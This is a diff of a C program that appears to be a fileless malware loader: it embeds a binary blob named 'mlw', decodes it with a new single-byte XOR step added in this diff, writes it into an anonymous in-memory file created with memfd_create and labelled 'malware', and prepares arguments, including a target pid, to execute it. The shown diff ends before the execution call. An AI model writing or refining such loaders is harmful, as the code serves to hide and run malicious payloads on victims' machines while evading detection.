@@ -3,9 +3,10 @@
 #include <string.h>
 #include <errno.h>
 #include <unistd.h>
+#include <sys/stat.h>
 
-extern const unsigned char _binary_mlw_start[];
-extern const unsigned char _binary_mlw_end[];
+extern unsigned char _binary_mlw_start[];
+extern unsigned char _binary_mlw_end[];
 
 int
 main(int argc, char *argv[])
@@ -15,7 +16,15 @@ main(int argc, char *argv[])
 		return 1;
 	}
 
+	unsigned char *start;
+	start = _binary_mlw_start;
+
+	unsigned char *end;
+	end = _binary_mlw_end;
+
 	printf("pid: %s\n", argv[1]);
+
+	int res;
 
 	int file;
 	file = syscall(SYS_memfd_create, "malware", 0);
@@ -24,17 +33,20 @@ main(int argc, char *argv[])
 		return 1;
 	}
 
+	const unsigned char key = 9;
+
 	size_t size;
-	size = _binary_mlw_end - _binary_mlw_start;
+	size = end - start;
+	for (size_t i = 0; i < size; ++i) {
+		start[i] ^= key;
+	}
 
 	ssize_t bytes;
-	bytes = write(file, _binary_mlw_start, size);
+	bytes = write(file, start, size);
 	if (bytes == -1) {
 		printf("failed to append the binary, err: %s\n", strerror(errno));
 		return 1;
 	}
-
-	int res;
 
 	char *args[] = { "", argv[1], NULL };
 	char *envp[] = { NULL };
